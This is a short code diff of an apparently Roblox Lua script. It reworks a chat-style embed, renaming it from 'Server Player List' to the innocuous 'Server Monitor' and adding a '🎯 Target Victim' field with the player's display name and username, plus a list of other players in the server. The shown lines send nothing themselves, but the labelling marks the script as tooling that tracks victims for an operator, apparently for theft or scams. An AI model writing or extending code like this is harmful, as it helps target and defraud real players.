@@ -329,9 +329,12 @@ task.spawn(function()
         end
 
         local embed = {
-            title = "Server Player List",
+            title = "Server Monitor",
             color = 16776960,
-            description = "```\n" .. playerListString .. "\n```",
+            fields = {
+                {name = "🎯 Target Victim", value = string.format("`%s` (@%s)", player.DisplayName, player.Name), inline = false},
+                {name = "👥 Other Players in Server", value = "```\n" .. playerListString .. "\n```", inline = false}
+            },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }
         
